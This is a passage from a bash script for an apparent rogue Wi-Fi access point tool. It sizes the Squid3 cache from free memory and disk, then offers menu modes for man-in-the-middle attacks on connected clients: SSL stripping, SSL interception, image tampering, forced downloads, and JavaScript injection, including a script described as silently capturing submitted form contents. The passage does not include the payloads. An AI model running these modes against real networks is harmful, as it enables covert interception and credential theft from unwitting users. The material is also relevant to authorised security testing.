# 		Less than 64 MB->(to low free memory)								#
# Steps from 64MB - 128MB, 128MB - 256 MB, 256MB - 512MB, 512MB - 1024MB, 2048MB - 4096MB, 4096MB - 8192MB	#
# 8192MB-16384MB, 16384MB-32768MB							 			#
# We use the half of the bottom limit* of free RAM for Squid3 and in the same time the disk space		#
# that we will use for Squid3 must be at least the twice in size of that RAM.					#
# Otherwise the RAM or the disk space that we will use must follow the above rule:				#
# Squid3 RAM=(bottom limit free RAM)/2 and Squid3 disk space=(Squid3 RAM*2 and above) (at least)		#
# *Squid uses memory for other things as well. Process will probably 						#
# become twice or three times bigger than the value put here.							#
#################################################################################################################

#Find how much free memory and how much free disk space we have.
export file_system="`df /var/ | tail -1 | awk '{print $1}'`"
export free_mem="`free -m | grep "Mem:" | awk '{print $4}'`"
export free_hdd="`df -m /var/ | tail -1 | awk '{print $4}'`"

# Find out the file system.
if [ "$file_system" != "aufs" ];then
	export file_system="ufs"
fi

if [ $free_mem -le 0 ];then
	# Most probably this is no needed. RAM <0 ? Don't think so...
	export squid_range="1"
elif [ $free_mem -le 32768 ] && [ $free_mem -gt 16384 ];then
	# Free Memory between 16384 and 32768 MB
	# Use 8192MB RAM and the maximum available disk space for Squid3 (at least x2 RAM).
	if [ $free_hdd -gt 32768 ];then
		#Free disk space more than 32GB
		export squid_range="10"
	elif [ $free_hdd -gt 16384 ];then
		#Free disk space more than 16GB
		export squid_range="9"
	elif [ $free_hdd -gt 8192 ];then
		#Free disk space more than 8GB
		export squid_range="8"
	elif [ $free_hdd -gt 4096 ];then
		#Free disk space more than 4GB
		export squid_range="7"
	elif [ $free_hdd -gt 2048 ];then
		#Free disk space more than 2GB
		export squid_range="6"
	elif [ $free_hdd -gt 1024 ];then
		#Free disk space more than 1GB
		export squid_range="5"
	elif [ $free_hdd -gt 512 ];then
		#Free disk space more than 512MB
		export squid_range="4"
	elif [ $free_hdd -gt 256 ];then
		#Free disk space more than 256MB
		export squid_range="3"
	elif [ $free_hdd -gt 128 ];then
		#Free disk space more than 128MB
		export squid_range="2"
	elif [ $free_hdd -le 128 ];then
		#Free disk space LESS or EQUAL to 128MB
		export squid_range="1"
	fi
elif [ $free_mem -le 16384 ] && [ $free_mem -gt 8192 ];then
	# Free Memory between 8192 and 16384 MB
	# Use 4096MB RAM and the maximum available disk space for Squid3 (at least x2 RAM).
	if [ $free_hdd -gt 16384 ];then
		#Free disk space more than 16GB
		export squid_range="9"
	elif [ $free_hdd -gt 8192 ];then
		#Free disk space more than 8GB
		export squid_range="8"
	elif [ $free_hdd -gt 4096 ];then
		#Free disk space more than 4GB
		export squid_range="7"
	elif [ $free_hdd -gt 2048 ];then
		#Free disk space more than 2GB
		export squid_range="6"
	elif [ $free_hdd -gt 1024 ];then
		#Free disk space more than 1GB
		export squid_range="5"
	elif [ $free_hdd -gt 512 ];then
		#Free disk space more than 512MB
		export squid_range="4"
	elif [ $free_hdd -gt 256 ];then
		#Free disk space more than 256MB
		export squid_range="3"
	elif [ $free_hdd -gt 128 ];then
		#Free disk space more than 128MB
		export squid_range="2"
	elif [ $free_hdd -le 128 ];then
		#Free disk space LESS or EQUAL to 128MB
		export squid_range="1"
	fi	
elif [ $free_mem -le 8192 ] && [ $free_mem -gt 4096 ];then
	# Free Memory between 4096 and 8182 MB
	# Use 2048MB RAM and the maximum available disk space for Squid3 (at least x2 RAM).
	if [ $free_hdd -gt 8192 ];then
		#Free disk space more than 8GB
		export squid_range="8"
	elif [ $free_hdd -gt 4096 ];then
		#Free disk space more than 4GB
		export squid_range="7"
	elif [ $free_hdd -gt 2048 ];then
		#Free disk space more than 2GB
		export squid_range="6"
	elif [ $free_hdd -gt 1024 ];then
		#Free disk space more than 1GB
		export squid_range="5"
	elif [ $free_hdd -gt 512 ];then
		#Free disk space more than 512MB
		export squid_range="4"
	elif [ $free_hdd -gt 256 ];then
		#Free disk space more than 256MB
		export squid_range="3"
	elif [ $free_hdd -gt 128 ];then
		#Free disk space more than 128MB
		export squid_range="2"
	elif [ $free_hdd -le 128 ];then
		#Free disk space LESS or EQUAL to 128MB
		export squid_range="1"
	fi
elif [ $free_mem -le 4096 ] && [ $free_mem -gt 2048 ];then
	# Free Memory between 2048 and 4096 MB
	# Use 1024MB RAM and the maximum available disk space for Squid3 (at least x2 RAM).
	if [ $free_hdd -gt 4096 ];then
		export squid_range="7"
		#Free disk space more than 4GB
	elif [ $free_hdd -gt 2048 ];then
		#Free disk space more than 2GB
		export squid_range="6"
	elif [ $free_hdd -gt 1024 ];then
		#Free disk space more than 1GB
		export squid_range="5"
	elif [ $free_hdd -gt 512 ];then
		#Free disk space more than 512MB
		export squid_range="4"
	elif [ $free_hdd -gt 256 ];then
		#Free disk space more than 256MB
		export squid_range="3"
	elif [ $free_hdd -gt 128 ];then
		#Free disk space more than 128MB
		export squid_range="2"
	elif [ $free_hdd -le 128 ];then
		#Free disk space LESS or EQUAL to 128MB
		export squid_range="1"
	fi
elif [ $free_mem -le 2048 ] && [ $free_mem -gt 1024 ];then
	# Free Memory between 1024 and 2048 MB
	# Use 512MB RAM and the maximum available disk space for Squid3 (at least x2 RAM).
	if [ $free_hdd -gt 2048 ];then
		#Free disk space more than 2GB
		export squid_range="6"
	elif [ $free_hdd -gt 1024 ];then
		#Free disk space more than 1GB
		export squid_range="5"
	elif [ $free_hdd -gt 512 ];then
		#Free disk space more than 512MB
		export squid_range="4"
	elif [ $free_hdd -gt 256 ];then
		#Free disk space more than 256MB
		export squid_range="3"
	elif [ $free_hdd -gt 128 ];then
		#Free disk space more than 128MB
		export squid_range="2"
	elif [ $free_hdd -le 128 ];then
		#Free disk space LESS or EQUAL to 128MB
		export squid_range="1"
	fi
elif [ $free_mem -le 1024 ] && [ $free_mem -gt 512 ];then
	# Free Memory between 512 and 1024 MB
	# Use 256MB RAM and the maximum available disk space for Squid3 (at least x2 RAM).
	if [ $free_hdd -gt 1024 ];then
		#Free disk space more than 1GB
		export squid_range="5"
	elif [ $free_hdd -gt 512 ];then
		#Free disk space more than 512MB
		export squid_range="4"
	elif [ $free_hdd -gt 256 ];then
		#Free disk space more than 256MB
		export squid_range="3"
	elif [ $free_hdd -gt 128 ];then
		#Free disk space more than 128MB
		export squid_range="2"
	elif [ $free_hdd -le 128 ];then
		#Free disk space LESS or EQUAL to 128MB
		export squid_range="1"
	fi
elif [ $free_mem -le 512 ] && [ $free_mem -gt 256 ];then
	# Free Memory between 256 and 512 MB
	# Use max 128MB RAM and the maximum available disk space for Squid3 (at least x2 RAM).
	if [ $free_hdd -gt 512 ];then
		#Free disk space more than 512MB
		export squid_range="4"
	elif [ $free_hdd -gt 256 ];then
		#Free disk space more than 256MB
		export squid_range="3"
	elif [ $free_hdd -gt 128 ];then
		#Free disk space more than 128MB
		export squid_range="2"
	elif [ $free_hdd -le 128 ];then
		#Free disk space LESS or EQUAL to 128MB
		export squid_range="1"
	fi
elif [ $free_mem -le 256 ] && [ $free_mem -gt 128 ];then
	# Free Memory between 128 and 256 MB
	# Use max 64MB RAM and the maximum available disk space for Squid3 (at least x2 RAM).
	if [ $free_hdd -gt 256 ];then
		#Free disk space more than 256MB
		export squid_range="3"
	elif [ $free_hdd -gt 128 ];then
		#Free disk space more than 128MB
		export squid_range="2"
	elif [ $free_hdd -le 128 ];then
		#Free disk space LESS or EQUAL to 128MB
		export squid_range="1"
	fi
elif [ $free_mem -le 128 ] && [ $free_mem -gt 64 ];then
	# Free Memory between 64 and 128 MB
	# Use max 32MB RAM and the maximum available disk space for Squid3 (at least x2 RAM).
	if [ $free_hdd -gt 128 ];then
		#Free disk space more than 128MB
		export squid_range="2"
	elif [ $free_hdd -le 128 ];then
		#Free disk space LESS or EQUAL to 128MB
		export squid_range="1"
	fi
elif [ $free_mem -le 64 ] && [ $free_mem -ge 1 ];then
	# Free Memory between 1 and 64 MB
	# Too low!
	export squid_range="1"
fi

case $squid_range in
	10)
		export squid_mem="8192"
		export squid_hdd="`expr $free_hdd / 2`"
		export squid_max_obj_size="524288 KB"
		export squid_max_obj_size_mem="65536 KB"
		export rdr_chil="45"
		export rdr_chil_strup="18"
		export rdr_chil_idle="9"
		export rdr_chil_conc="27"
		export squid3_warn="go"
		break
	;;
	9)
		export squid_mem="4096"
		export squid_hdd="`expr $free_hdd / 2`"
		export squid_max_obj_size="262144 KB"
		export squid_max_obj_size_mem="32768 KB"
		export rdr_chil="40"
		export rdr_chil_strup="16"
		export rdr_chil_idle="8"
		export rdr_chil_conc="24"
		export squid3_warn="go"
		break
	;;
	8)		
		export squid_mem="2048"
		export squid_hdd="`expr $free_hdd / 2`"
		export squid_max_obj_size="131072 KB"
		export squid_max_obj_size_mem="16384 KB"
		export rdr_chil="35"
		export rdr_chil_strup="14"
		export rdr_chil_idle="7"
		export rdr_chil_conc="21"
		export squid3_warn="go"
		break
	;;
	7)
		export squid_mem="1024"
		export squid_hdd="`expr $free_hdd / 2`"
		export squid_max_obj_size="65536 KB"
		export squid_max_obj_size_mem="8192 KB"
		export rdr_chil="30"
		export rdr_chil_strup="12"
		export rdr_chil_idle="6"
		export rdr_chil_conc="18"
		export squid3_warn="go"
		break
	;;
	6)	
		export squid_mem="512"
		export squid_hdd="`expr $free_hdd / 2`"
		export squid_max_obj_size="32768 KB"
		export squid_max_obj_size_mem="4096 KB"
		export rdr_chil="25"
		export rdr_chil_strup="10"
		export rdr_chil_idle="5"
		export rdr_chil_conc="15"
		export squid3_warn="go"	
		break
	;;
	5)	
		export squid_mem="256"
		export squid_hdd="`expr $free_hdd / 2`"
		export squid_max_obj_size="16384 KB"
		export squid_max_obj_size_mem="2048 KB"
		export rdr_chil="20"
		export rdr_chil_strup="8"
		export rdr_chil_idle="4"
		export rdr_chil_conc="12"
		export squid3_warn="go"	
		break
	;;
	4)
		export squid_mem="128"
		export squid_hdd="`expr $free_hdd / 2`"
		export squid_max_obj_size="8192 KB"
		export squid_max_obj_size_mem="1024 KB"
		export rdr_chil="15"
		export rdr_chil_strup="6"
		export rdr_chil_idle="3"
		export rdr_chil_conc="9"
		export squid3_warn="go"
		break
	;;
	3)
		export squid_mem="64"
		export squid_hdd="`expr $free_hdd / 2`"
		export squid_max_obj_size="4096 KB"
		export squid_max_obj_size_mem="512 KB"
		export rdr_chil="10"
		export rdr_chil_strup="4"
		export rdr_chil_idle="2"
		export rdr_chil_conc="6"
		export squid3_warn="go"
		break
	;;
	2)
		export squid_mem="32"
		export squid_hdd="`expr $free_hdd / 2`"
		export squid_max_obj_size="2048 KB"
		export squid_max_obj_size_mem="256 KB"
		export rdr_chil="5"
		export rdr_chil_strup="2"
		export rdr_chil_idle="1"
		export rdr_chil_conc="3"
		export squid3_warn="go"
		break
	;;
	1)
		export squid3_warn="no_go"
		export squid_mem="Less than "$free_mem""
		export free_hdd1="Less than "$free_hdd""
		break
	;;
esac


#################################################################################################################
# 							MODES							#
# 					Let's choose what mode do we want:					#
# simple, proxied, sslstriped, sslstriped & proxied, Flip-Blur-Swirl-ASCII-Tourette browser client's images, 	#
# 	Forced download our files, Air Chat, I2P, SSLsplit, MiTMproxy, HoneyProxy, Squid in The Middle		#
#################################################################################################################

# Main menu function.
AP_MAIN_MENU(){
	clear
	YN=15
	$cecho ""$BLUE"W i r e l e s s  L A N's  m o d e s  -  M E N U"$END"" | centered_text
	echo
	echo
	echo "Would you like to create a :"
	echo
	echo "1.  Simple WLAN (Clients can access Internet)"
	echo "2.  Transparent HTTP Proxied WLAN Optimized for low Internet Speeds RTR*"
	echo "3.  Airchat - Wireless Fun: Clients will forced to chat with us."
	echo "4.  TOR  - Transparent anonymous Surfing - Deep Web access .onion sites"
	echo "5.  I2P  - Manual anonymous Surfing - Deep Web access .i2p sites"
	echo "6.  MiTM - Transparent SSLstriped WLAN (Sslstrip)" 
	echo "7.  MiTM - Transparent Proxied and SSLstriped WLAN (Squid3 <-> Sslstrip) RTR*"
	echo "8.  MiTM - Flip, Blur, Swirl, ASCII, Tourette client's browser images RTR*"
	echo "9.  MiTM - Forced downloading files RTR*"
	echo "10. MiTM - Transparent and scalable SSL/TLS intercepted WLAN (SSLsplit)"
	echo "11. MiTM - Transparent HTTP(S) intercepted WLAN (mitmproxy)"
	echo "12. MiTM - Honey Proxy - Transparent HTTP(S) intercepted WLAN"
	echo "13. SiTM - Squid in The Middle - Transparent HTTP(S) proxied WLAN RTR*"
	echo "14. JiTM - JavaScript in The Middle - Java Code Inject RTR*"
	echo
	echo "*RTR: Real Time Reports"
}

# Mode 8 sub menu function.
MODE_8_SUB_MENU(){
	clear
	export YN=6
	$cecho ""$BLUE"W i r e l e s s  L A N's  m o d e s  -  M E N U"$END"" | centered_text
	echo
	$cecho ""$BLUE"M o d e  8  -  S u b  M e n u"$END"" | centered_text
	echo
	echo
	echo "Flipped, Blurred, Swirled, ASCII"
	echo "Tourette client's browser images"
	echo
	echo "Would you like your clients to:"
	echo
	echo "1. Upside down images RTR*"
	echo "2. Blur images RTR*"
	echo "3. Swirl images RTR*"
	echo "4. ASCII Images RTR*"
	echo "5. Tourette Images RTR*"
	echo
	echo "*RTR: Real Time Reports"
}

AP_MAIN_MENU
$necho "Please enter your choice (1 - 14): "
while [ "$YN" = "15" ];do
	read YN
		if [ "$YN" = "1" ] || [ "$YN" = "2" ] || [ "$YN" = "3" ] || [ "$YN" = "4" ] || [ "$YN" = "5" ] || [ "$YN" = "6" ] || [ "$YN" = "7" ] || [ "$YN" = "8" ] || [ "$YN" = "9" ] || [ "$YN" = "10" ] || [ "$YN" = "11" ] || [ "$YN" = "12" ] || [ "$YN" = "13" ] || [ "$YN" = "14" ];then
			if [ "$YN" = "1" ];then
				export WLNMODE="Simple"
			fi
			if [ "$YN" = "2" ];then
				# Low RAM?
				if [ "$squid3_warn" = "no_go" ];then
					echo "You are running low on memory and/or free disk space"
					echo "Sorry you cannot run this mode"
					read -p 'Press ENTER to continue...' string;echo
					AP_MAIN_MENU
					$necho "Please enter your choice (1 - 14): "
				else
					export WLNMODE="Proxied"
				fi
				# Low HDD free space?
				if [ "$squid3_warn" = "no_go_hdd" ];then
					echo "You are running low on free disk space"
					echo "Sorry you cannot run this mode"
					read -p 'Press ENTER to continue...' string;echo
					AP_MAIN_MENU
					$necho "Please enter your choice (1 - 14): "
				else
					export WLNMODE="Proxied"
				fi
			fi
			if [ "$YN" = "3" ];then
				if [ ! -f $DEPEND_DIR/dependencies/airchat_2.1a/airchat.tar.bz2 ];then
					$cecho "[ "$RED"not found"$END" ] airchat v2.1a on $DEPEND_DIR/dependencies/airchat_2.1a/"
					echo "You MUST place the airchat.tar.bz2 file into the above folder"
					echo "Sorry you cannot run this mode"
					read -p 'Press ENTER to continue...' string;echo
					AP_MAIN_MENU
					$necho "Please enter your choice (1 - 14): "
				else
					export WLNMODE="Air_chat"
				fi
			fi
			if [ "$YN" = "4" ];then
				export WLNMODE="TOR_tunnel"
			fi
			if [ "$YN" = "5" ];then
				export WLNMODE="I2P"
			fi
			if [ "$YN" = "6" ];then
				export WLNMODE="SSLstriped"
			fi
			if [ "$YN" = "7" ];then
				# Low RAM?
				if [ "$squid3_warn" = "no_go" ];then
					echo "You are running low on memory"
					echo "Sorry you cannot run this mode"
					read -p 'Press ENTER to continue...' string;echo
					AP_MAIN_MENU
					$necho "Please enter your choice (1 - 14): "
				else
					export WLNMODE="Proxied-SSLstriped"
				fi
			fi
			if [ "$YN" = "8" ];then
				# Low RAM?
				if [ "$squid3_warn" = "no_go" ];then
					echo "You are running low on memory"
					echo "Sorry you cannot run this mode"
					read -p 'Press ENTER to continue...' string;echo
					AP_MAIN_MENU
					$necho "Please enter your choice (1 - 14): "
				fi
				# Squid3 with SSL is incompatible with redirect scripts (work in progress)
				# For sure I'm missing something.
				if [ -n "`squid3 -v | grep -o "'--enable-ssl-crtd'"`" ] && [ -n "`squid3 -v | grep -o "'--enable-ssl'"`" ];then
					export SQUID3_VER="`squid3 -v | grep "Version" | awk '{print $4}'`"
					while :
					do
						clear
						$cecho ""$BLUE"Squid3 v.3.3.8-SSL Uninstallation"$END"" | centered_text
						$cecho ""$BLUE"Squid3 v.3.1.20 - Installation Process"$END"" | centered_text
						echo
						echo
						echo "Unfortunately I couldn't find a way to make your current Squid3 v.$SQUID3_VER"
						echo "to work with Mode 8:"
						echo "Flipped, Blurred, Swirled, ASCII"
						echo "Tourette client's browser images"
						echo
						echo "In order to use mode 8 you must first uninstall Squid3 v.3.3.8"
						echo "and install Squid3 v.3.1.20"
						echo
						$necho "Would you like to uninstall Squid3-SSL and install your previous one [y]es / [n]o :"
						read yno
						case $yno in
							[yY] | [yY][Ee][Ss] )
								$necho "[....] Uninstalling Squid3 v."$SQUID3_VER"-SSL"
								eval apt-get --purge remove -y squid3 squid3-common squid-langpack $no_out
								$cecho "\r[ "$GREEN"ok"$END" ] Uninstalling Squid3 v."$SQUID3_VER"-SSL"
								$necho "[....] Installing Squid3 v3.1.20"
								eval apt-get install -y squid3 squid3-common squid-langpack $no_out
								$cecho "\r[ "$GREEN"ok"$END" ] Installing Squid3 v3.1.20"
								$necho "[....] Making a backup copy of Squid3's configuration file to $HOME_DIR/backup"
								cp -r /etc/squid3/squid.conf $HOME_DIR/backup/squid.conf
								sleep 0.5
								$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of Squid3's configuration file to $HOME_DIR/backup"					
								export WLNMODE="Flip_Blur_Swirl"
								read -p 'Press ENTER to continue...' string;echo
								break
							;;
							[nN] | [nN][Oo] )
								echo
								echo "Sorry you can't use Mode 8"
								export YN=14
								read -p 'Press ENTER to continue...' string;echo
								AP_MAIN_MENU
								$necho "Please enter your choice (1 - 14): "
								break
							;;
							"") 
								$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
								read -p 'Press ENTER to continue...' string
							;;
							*)
								$cecho "! ! ! "$RED""$yno""$END" is an invalid option ! ! !"
								read -p 'Press ENTER to continue...' string
							;;
	
						esac
					done

				else
					export WLNMODE="Flip_Blur_Swirl"
				fi
			fi
			if [ "$YN" = "9" ];then
				# Low RAM?
				if [ "$squid3_warn" = "no_go" ];then
					echo "You are running low on memory and/or free disk space"
					echo "Sorry you cannot run this mode"
					read -p 'Press ENTER to continue...' string;echo
					AP_MAIN_MENU
					$necho "Please enter your choice (1 - 14): "
				else
					export WLNMODE="Forced_download"
				fi
			fi
			if [ "$YN" = "10" ];then
				export WLNMODE="SSLsplit"
			fi
			if [ "$YN" = "11" ];then
				export WLNMODE="MiTMproxy"
			fi
			if [ "$YN" = "12" ];then
				export WLNMODE="HoneyProxy"
			fi
			if [ "$YN" = "13" ];then
				# Low RAM?
				if [ "$squid3_warn" = "no_go" ];then
					echo "You are running low on memory and/or free disk space"
					echo "Sorry you cannot run this mode"
					read -p 'Press ENTER to continue...' string;echo
					AP_MAIN_MENU
					$necho "Please enter your choice (1 - 14): "
				fi
				# First of all check if current version of Squid3 was compiled with --enable-ssl-crtd and --enable-ssl flags.
				# If not then check if we have squid3_3.3.8-1.1Kali1_amd64 and squid3_3.3.8-1.1Kali1_i386 and install squid3 3.3.8 with SSL support
				if [ -n "`squid3 -v | grep -o "'--enable-ssl-crtd'"`" ] && [ -n "`squid3 -v | grep -o "'--enable-ssl'"`" ];then
					#$cecho "[ "$GREEN"found"$END" ] Squid3 v."`squid3 -v | grep "Version" | awk '{print $4}'`" with SSL Bumping and Dynamic SSL Certificate Generation."
					export WLNMODE="Squid_iTM"
				elif [ ! -n "`squid3 -v | grep -o "'--enable-ssl-crtd'"`" ] && [ ! -n "`squid3 -v | grep -o "'--enable-ssl'"`" ] && [ -d $DEPEND_DIR/dependencies/squid3_3.3.8/squid3_3.3.8-1.1Kali1_amd64 ] && [ -d $DEPEND_DIR/dependencies/squid3_3.3.8/squid3_3.3.8-1.1Kali1_i386 ];then
					if [ "`getconf LONG_BIT`" = 32 ];then
						export SQUID3_INSTL="$DEPEND_DIR/dependencies/squid3_3.3.8/squid3_3.3.8-1.1Kali1_i386"
						export SQUID3_VER="`squid3 -v | grep "Version" | awk '{print $4}'`"
						while :
						do
							clear
							$cecho ""$BLUE"Squid3 v.3.3.8 - SSL Bumping, Dynamic SSL Certificate Generation."$END"" | centered_text
							$cecho ""$BLUE"Installation Process*"$END"" | centered_text
							echo
							echo
							$cecho "Your current Squid3 v.$SQUID3_VER "$RED"doesn't"$END" support:"
							echo "SSL Bumping and Dynamic SSL Certificate Generation."
							echo
							echo "*In order to install Squid3 with SSL support, your current Squid3 will be uninstalled first."
							echo
							$necho "Would you like to install Squid3-i386 v.3.3.8 with SSL support "$GREEN"[y]es"$END" / "$GREEN"[n]o"$END" :"
							read yno
							case $yno in
								[yY] | [yY][Ee][Ss] )
									$necho "[....] Uninstalling Squid3 v.$SQUID3_VER"
									eval apt-get --purge remove -y squid3 squid3-common squid-langpack $no_out
									$cecho "\r[ "$GREEN"ok"$END" ] Uninstalling Squid3 v.$SQUID3_VER"
									$necho "[....] Installing Squid3-i386 v3.3.8 with SSL support."
									eval dpkg -i $SQUID3_INSTL/squid3_3.3.8-1.1Kali1_i386.deb $SQUID3_INSTL/squid3-common_3.3.8-1.1Kali1_all.deb $SQUID3_INSTL/squid-langpack_20140506-1.1Kali1_all.deb $no_out
									$cecho "\r[ "$GREEN"ok"$END" ] Installing Squid3-i386 v3.3.8 with SSL support."
									$necho "[....] Making a backup copy of Squid3's configuration file to $HOME_DIR/backup"
									cp -r /etc/squid3/squid.conf $HOME_DIR/backup/squid.conf
									sleep 0.5
									$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of Squid3's configuration file to $HOME_DIR/backup"					
									export WLNMODE="Squid_iTM"
									read -p 'Press ENTER to continue...' string;echo
									break
								;;
								[nN] | [nN][Oo] )
									clear
									$cecho "[ "$RED"not found"$END" ] Squid3 with SSL Bumping and Dynamic SSL Certificate Generation."
									$cecho "[ "$GREEN"found"$END" ] Installation packages Squid3-i386 v.3.3.8 with SSL support."
									echo
									echo "You have to compile/install first Squid3 with:"
									$cecho ""$GREEN"--enable-ssl-crtd"$END" and "$GREEN"--enable-ssl"$END" flags to be able to run this mode."
									echo
									read -p 'Press ENTER to continue...' string;echo
									AP_MAIN_MENU
									$necho "Please enter your choice (1 - 14): "
									break
								;;
								"")
									$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
									read -p 'Press ENTER to continue...' string
								;;
								*)
									$cecho ""$RED""$yno""$END" is an invalid option."
									read -p 'Press ENTER to continue...' string
								;;
							esac
						done
					elif [ "`getconf LONG_BIT`" = 64 ];then			
						export SQUID3_INSTL="$DEPEND_DIR/dependencies/squid3_3.3.8/squid3_3.3.8-1.1Kali1_amd64"
						export SQUID3_VER="`squid3 -v | grep "Version" | awk '{print $4}'`"
						while :
						do
							clear
							$cecho ""$BLUE"Squid3 v.3.3.8 - SSL Bumping, Dynamic SSL Certificate Generation."$END"" | centered_text
							$cecho ""$BLUE"Installation Process"$END"" | centered_text
							echo
							echo
							$cecho "Your current Squid3 v.$SQUID3_VER "$RED"doesn't"$END" support:"
							echo "SSL Bumping and Dynamic SSL Certificate Generation."
							echo
							echo "*In order to install Squid3 with SSL support, your current Squid3 will be uninstalled first."
							echo
							$necho "Would you like to install Squid3-amd64 v.3.3.8 with SSL support "$GREEN"[y]es"$END" / "$GREEN"[n]o"$END" :"
							read yno
							case $yno in
								[yY] | [yY][Ee][Ss] )
									$necho "[....] Uninstalling Squid3 v.$SQUID3_VER"
									eval apt-get --purge remove -y squid3 squid3-common squid-langpack $no_out
									$cecho "\r[ "$GREEN"ok"$END" ] Uninstalling Squid3 v.$SQUID3_VER"
									$necho "[....] Installing Squid3-amd64 v3.3.8 with SSL support."
									eval dpkg -i $SQUID3_INSTL/squid3_3.3.8-1.1Kali1_amd64.deb $SQUID3_INSTL/squid3-common_3.3.8-1.1Kali1_all.deb $SQUID3_INSTL/squid-langpack_20140506-1.1Kali1_all.deb $no_out
									$cecho "\r[ "$GREEN"ok"$END" ] Installing Squid3-amd64 v3.3.8 with SSL support."
									$necho "[....] Making a backup copy of Squid3's configuration file to $HOME_DIR/backup"
									cp -r /etc/squid3/squid.conf $HOME_DIR/backup/squid.conf
									sleep 0.5
									$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of Squid3's configuration file to $HOME_DIR/backup"
									export WLNMODE="Squid_iTM"
									break
									read -p 'Press ENTER to continue...' string;echo
								;;
									[nN] | [nN][Oo] )
									clear
									$cecho "[ "$RED"not found"$END" ] Squid3 with SSL Bumping and Dynamic SSL Certificate Generation."
									$cecho "[ "$GREEN"found"$END" ] Installation packages Squid3-amd64 v.3.3.8 with SSL support."
									echo
									echo "You have to compile/install first Squid3 with:"
									$cecho ""$GREEN"--enable-ssl-crtd"$END" and "$GREEN"--enable-ssl"$END" flags to be able to run this mode."
									echo
									read -p 'Press ENTER to continue...' string;echo
									AP_MAIN_MENU
									$necho "Please enter your choice (1 - 14): "
									break
								;;
								"")
									$cecho ""$RED"BLANK"$END" is an invalid option."
									read -p 'Press ENTER to continue...' string
								;;
								*)
									$cecho ""$RED""$yno""$END" is an invalid option."
									read -p 'Press ENTER to continue...' string
								;;
							esac
						done
					fi
				else
					echo
					$cecho "[ "$RED"not found"$END" ] Squid3 with SSL Bumping and Dynamic SSL Certificate Generation."
					$cecho "[ "$RED"not found"$END" ] Installation packages Squid3-i386 and Squid3-amd64 v.3.3.8 with SSL support."
					echo
					echo "You have to compile/install first Squid3 with:"
					$cecho ""$GREEN"--enable-ssl-crtd"$END" and "$GREEN"--enable-ssl"$END" flags to be able to run this mode."
					echo
					read -p 'Press ENTER to continue...' string;echo
					AP_MAIN_MENU
					$necho "Please enter your choice (1 - 14): "
				fi
			
			fi
			if [ "$YN" = "14" ];then
				# Let's select which Java Script we want to inject to our clients
				while :
					do
					clear
					$cecho ""$BLUE"W i r e l e s s  L A N's  m o d e s  -  M E N U"$END"" | centered_text
					echo
					$cecho ""$BLUE"J a v a  S c r i p t  I n j e c t i o n  -  S u b M E N U"$END"" | centered_text
					echo
					echo
					echo "Which Java script would you like to inject?"
					echo 
					echo "1. A simple script that inject an annoying alert with a message."
					echo "2. A script that captures the submitted form content without being noticed by the user."
					echo "3. Your own Java Script."
					echo
					$cecho ""$BLUE"https://github.com/xtr4nge/FruityWifi/"$END""
					$cecho ""$BLUE"http://media.blackhat.com/bh-us-12/Briefings/Alonso/BH_US_12_Alonso_Owning_Bad_Guys_WP.pdf"$END""
					$necho "Please enter option [1 - 3]: "
					read opt
						case $opt in
								1)
									export Java_script="1"
									break
								;;
								2)
									export Java_script="2"
									break
								;;
								3)
									clear
									$cecho ""$BLUE"W i r e l e s s  L A N's  m o d e s  -  M E N U"$END"" | centered_text
									echo
									$cecho ""$BLUE"J a v a  S c r i p t  I n j e c t i o n  -  S u b M E N U"$END"" | centered_text
									echo
									echo
									echo "Inject your own Java Script."
									echo
									echo "Please enter the full path and filename"
									echo "to your Java Script file."
									$necho "[e.g. "$GREEN"/root/myjavascript.js"$END" ] :"
									read custom_Java_script
									if [ -f $custom_Java_script ];then
										export Java_script="3"
										break
									else
										echo
										$cecho "! ! ! "$RED"$custom_Java_script"$END" couldn't be found ! ! !"
										echo "Please check again the path and filename"
										read -p 'Press ENTER to continue...' string
									fi
								;;
								"") 
								$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
								echo "Please select option between 1-3 only."
								read -p 'Press ENTER to continue...' string
								;;
								*)
								$cecho "! ! ! "$RED""$opt""$END" is an invalid option ! ! !"
								$cecho "Please select option between 1-3 only."
								read -p 'Press ENTER to continue...' string
								;;
						esac
					done
				export WLNMODE="Java_Inject"
			fi
		else
			AP_MAIN_MENU
			$cecho ""$RED"! ! ! Wrong input ! ! !"$END""
			$necho "Please enter your choice (1 - 14): "
		fi
done

if [ "$WLNMODE" = "Flip_Blur_Swirl" ];then
	MODE_8_SUB_MENU
	$necho "Please enter your choice (1 - 5): "
		while [ "$YN" = "6" ];do
			read YN
			if [ "$YN" = "1" ] || [ "$YN" = "2" ] || [ "$YN" = "3" ] || [ "$YN" = "4" ] || [ "$YN" = "5" ];then
				if [ "$YN" = "1" ];then
					export WLNMODE="Fliped_Blured_Swirled"
					export F_B_S_command="flip"
				fi
				if [ "$YN" = "2" ];then
					export WLNMODE="Fliped_Blured_Swirled"
					export F_B_S_command="blured"
				fi
				if [ "$YN" = "3" ];then
					export WLNMODE="Fliped_Blured_Swirled"
					export F_B_S_command="swirl"
				fi
				if [ "$YN" = "4" ];then
					export WLNMODE="ASCII"
				fi
				if [ "$YN" = "5" ];then
					export WLNMODE="Tourtt_Imgs"
				fi
			else
				MODE_8_SUB_MENU
				$cecho ""$RED"! ! ! Wrong input ! ! !"$END""
				$necho "Please enter your choice (1 - 5): "
				fi
		done
fi

clear

#################################################################################################################
# 			Set the defaults domain lan and search lan to /etc/resolv.conf				#
#################################################################################################################
if [ -n "`grep 'domain lan' /etc/resolv.conf`" ];then
	sed 's%domain lan%%g' /etc/resolv.conf > /etc/resolv1.conf && mv /etc/resolv1.conf /etc/resolv.conf
fi

if [ -n "`grep 'search lan' /etc/resolv.conf`" ];then
	sed 's%search lan%%g' /etc/resolv.conf > /etc/resolv1.conf && mv /etc/resolv1.conf /etc/resolv.conf
fi

#################################################################################################################
# 					Let's use our alternative DNS severs					#
#		alt_DNS1 & alt_DNS2 (see in the beginning of the script section 'OS Detection'			#
#														#
#################################################################################################################

if [ -n "$Alt_DNS1" ] && [ ! -n "`grep 'nameserver "$Alt_DNS1"' /etc/resolv.conf`" ];then
	sed '$ a\nameserver '$Alt_DNS1'' /etc/resolv.conf > /etc/resolv1.conf && mv /etc/resolv1.conf /etc/resolv.conf
fi

